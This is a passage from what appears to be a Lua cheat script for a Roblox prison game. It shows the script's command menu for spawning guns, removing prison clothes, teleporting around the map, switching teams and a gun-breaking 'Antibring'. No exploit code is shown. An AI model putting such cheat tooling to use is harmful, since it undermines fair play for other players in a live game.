        :saui - better spam arrest i think
        :rj - Rejoin
        :clothes - Removes Prison Clothes
        :m4 - Gives M4
        :ak - Gives AK
        :remi - Gives REMI
        :m9 - Gives M9
        :ab - Antibring (op breaks all guns)


        Teleports
        :moutain
        :empty
        :safe
        :back
        :gate
        :flag
        :cell
        :roof
        :cafe
        :nex
        :armory
        :sewer
        :unmap
        :store
        :gas
        :bus
        :bridge
        :yard
        :cbase

        	Teams
        :t custom (NUMBER)
        :t dr - DARK RED
        :t g - DARK GREEN
        :t p - PURPLE
        :t fb - FAWN BROWN
        :t mg - MID GRAY
        :t hp - HOT PINK
        :t t - TEAL (this works)
        :t dt - DARK TAUPE
        :t b - BLACK
        :t c - CAMO
        :t too - TOOTHPASTE (just use :t t)
        :t rb - REALLY BLACK
        :t rp - ROYAL PURPLE
        :t sun - SUNRISE
        :t lp - LIGHT PURPLE
        :t lg - LIGHT GOLD
        :t b - PASTEL BLUE
        :t rl - REDDISH LILAC
        :t y - PASTEL YELLOW
        :crim
        :g
        :neu
        :i
    ]]

			end-- cmd end
		end-- cmd end

	)